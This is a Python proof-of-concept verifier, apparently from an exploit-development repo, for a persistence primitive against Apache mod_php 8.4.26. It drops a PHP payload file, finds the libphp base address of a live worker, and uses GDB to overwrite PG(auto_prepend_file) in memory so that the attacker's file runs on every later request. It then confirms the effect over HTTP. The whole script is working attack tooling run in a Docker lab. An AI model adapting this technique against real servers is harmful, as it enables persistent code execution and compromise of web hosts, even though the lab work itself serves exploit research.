#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Verifier for the PG(auto_prepend_file) persistent dispatch primitive
(auto_prepend_persist.py) on the 8.4.26-apache mod_php libphp.so.

Lab bring-up / run / teardown (from the repo root; GDB-assisted write8 path):
    docker compose -f docker-compose.reuse.yml --profile pgpersist up -d
    python3 -I poc/primitives/dispatch/verify_auto_prepend_persist.py
    docker compose -f docker-compose.reuse.yml --profile pgpersist down
(container php2shell_pgpersist-pgp-apache-1, :8096; override with PGP_CONTAINER.)

What it proves
--------------
  1. BASELINE: a request to the lab BEFORE the write does NOT emit the marker.
  2. WRITE:    install the primitive -- point PG(auto_prepend_file) at an
               attacker-dropped PHP file (/tmp/p.php) that echoes a unique
               marker. The 8-byte writes are driven through the real
               auto_prepend_persist.install() code path; the write8 transport
               here is GDB-ASSISTED (attach worker, poke memory, detach). The
               mechanism under test -- "PG(apf) write -> persistent per-request
               include" -- is identical regardless of how the 8 bytes land.
  3. PERSIST:  2+ SUBSEQUENT requests to the same worker DO emit the marker.

Verification is by REQUEST BEHAVIOR only (ini_get is not a valid oracle).

Lab: docker-compose.reuse.yml --profile pgpersist (php2shell_c2-apache-vuln
image, prefork MaxRequestWorkers 1, host port 8096). gdb must be present in the
container (the script installs it if missing) and the container needs
CAP_SYS_PTRACE + seccomp:unconfined (the compose file grants both).

Pure stdlib. Run:  python3 -I poc/primitives/dispatch/verify_auto_prepend_persist.py
"""

import os
import re
import struct
import subprocess
import sys
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import auto_prepend_persist  # noqa: E402  the primitive under test

CONTAINER = os.environ.get("PGP_CONTAINER", "php2shell_pgpersist-pgp-apache-1")
URL = os.environ.get("PGP_URL", "http://localhost:8096/index.php")
PAYLOAD_PATH = "/tmp/p.php"
MARKER = "PGPERSIST_MARKER_" + "%08x" % (os.getpid() & 0xffffffff)


from common.labharness import sh  # noqa: E402


def dexec(*cmd):
    return sh("docker", "exec", CONTAINER, *cmd)


def http_body(timeout=15):
    try:
        with urllib.request.urlopen(URL, timeout=timeout) as r:
            return r.read().decode(errors="replace")
    except Exception as e:
        # A "headers already sent" from the prepend still returns a 200 body via
        # urlopen; other errors (e.g. HTTPError) still carry a body.
        if hasattr(e, "read"):
            try:
                return e.read().decode(errors="replace")
            except Exception:
                pass
        return "<http-error: %r>" % e


def worker_pid_and_base():
    """Return (worker_pid, libphp_base). The worker is the non-master
    'apache2 -DFOREGROUND'; base = first (offset 0) libphp.so mapping."""
    pids = dexec("pgrep", "-f", "apache2 -DFOREGROUND").split()
    pids = sorted(int(p) for p in pids)
    if len(pids) < 2:
        # warm one request so a worker is forked, then retry
        http_body()
        pids = sorted(int(p) for p in dexec("pgrep", "-f",
                                            "apache2 -DFOREGROUND").split())
    worker = pids[-1]  # master is the lowest pid; the child worker is higher
    maps = dexec("cat", "/proc/%d/maps" % worker)
    base = None
    for line in maps.splitlines():
        if "libphp.so" in line and " 00000000 " in line:
            base = int(line.split("-", 1)[0], 16)
            break
    if base is None:
        raise RuntimeError("libphp.so base not found in worker %d maps" % worker)
    return worker, base


def gdb_write8_batch(pid, ops):
    """Apply a list of (abs_addr, qword) writes to process `pid` via a single
    gdb attach/detach. This is the GDB-ASSISTED write8 transport."""
    exprs = []
    for addr, val in ops:
        exprs += ["-ex", "set {unsigned long}0x%x = 0x%x" % (addr, val)]
    exprs += ["-ex", "detach", "-ex", "quit"]
    out = dexec("gdb", "-p", str(pid), "-batch", *exprs)
    return out


def main():
    print("== PG(auto_prepend_file) PERSISTENT dispatch -- mechanism proof ==")
    print("container = %s" % CONTAINER)
    print("url       = %s" % URL)
    print("marker    = %s" % MARKER)

    # Offsets for this exact binary (derived in auto_prepend_persist.APACHE_8426_OFFSETS).
    off = auto_prepend_persist.APACHE_8426_OFFSETS

    # ---- 1. BASELINE (before the write): marker must be ABSENT ----
    base_body = http_body()
    base_has = MARKER in base_body
    print("\n[1] BASELINE request body: %r" % base_body[:120])
    print("    marker present? %s  (expect False)" % base_has)
    if base_has:
        raise SystemExit("ABORT: marker already present before write")

    # ---- 2a. drop the attacker payload file on the target ----
    payload = "<?php echo \"%s\\n\"; ?>" % MARKER
    dexec("sh", "-c", "cat > %s <<'EOF'\n%s\nEOF" % (PAYLOAD_PATH, payload))
    dexec("sh", "-c", "chmod 644 %s" % PAYLOAD_PATH)
    print("\n[2a] dropped %s:\n     %s"
          % (PAYLOAD_PATH, dexec("cat", PAYLOAD_PATH).strip()))

    # ---- 2b. locate the live worker + libphp base ----
    worker, base = worker_pid_and_base()
    apf = auto_prepend_persist.apf_addr(base, off)
    scratch = base + off["pg_scratch_off"]
    print("\n[2b] worker pid        = %d" % worker)
    print("     libphp base       = 0x%x" % base)
    print("     PG(auto_prepend)  = 0x%x  (base + 0x%x)" % (apf, off["auto_prepend_off"]))
    print("     scratch (.bss)    = 0x%x  (base + 0x%x)" % (scratch, off["pg_scratch_off"]))

    # ---- 2c. install via the REAL primitive, collecting the 8-byte writes ----
    ops = []
    def collector(addr, qword):
        ops.append((addr, qword))
    target, str_addr = auto_prepend_persist.install(base, off, collector, PAYLOAD_PATH)
    print("\n[2c] auto_prepend_persist.install() planned %d writes:" % len(ops))
    for addr, val in ops:
        print("       [0x%x] = 0x%016x" % (addr, val))
    print("     PG(auto_prepend_file) target=0x%x  -> string@0x%x" % (target, str_addr))

    # ---- 2d. apply the writes (gdb-assisted transport) ----
    gdb_out = gdb_write8_batch(worker, ops)
    tail = "\n".join(l for l in gdb_out.splitlines()
                     if l.strip())[-400:]
    print("\n[2d] gdb write transport output (tail):\n%s" % tail)

    # verify PG now holds the scratch pointer (read-back via gdb, not ini_get)
    rb = dexec("gdb", "-p", str(worker), "-batch",
               "-ex", "x/gx 0x%x" % apf,
               "-ex", "x/s 0x%x" % str_addr,
               "-ex", "detach", "-ex", "quit")
    print("     read-back:\n%s"
          % "\n".join("       " + l for l in rb.splitlines()
                      if "0x" in l and ":" in l))

    # ---- 3. PERSIST: subsequent requests must now emit the marker ----
    print("\n[3] subsequent requests (expect marker on EACH):")
    results = []
    for i in range(3):
        body = http_body()
        has = MARKER in body
        results.append(has)
        print("    req #%d marker present? %s   body[:80]=%r"
              % (i + 1, has, body[:80]))

    ok = (not base_has) and all(results)
    print("\n== RESULT: %s ==" % ("PASS" if ok else "FAIL"))
    print("   baseline marker absent : %s" % (not base_has))
    print("   marker on req 1/2/3    : %s" % results)
    print("   write method           : GDB-ASSISTED write8 (worker %d)" % worker)
    print("   persistence held       : %s" % (all(results) and len(results) >= 2))

    # ---- cleanup: restore PG=NULL so the lab is reusable ----
    gdb_write8_batch(worker, [(apf, 0)])
    after = http_body()
    print("\n[cleanup] PG(apf) reset to NULL; post-reset marker present? %s "
          "(expect False)" % (MARKER in after))

    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
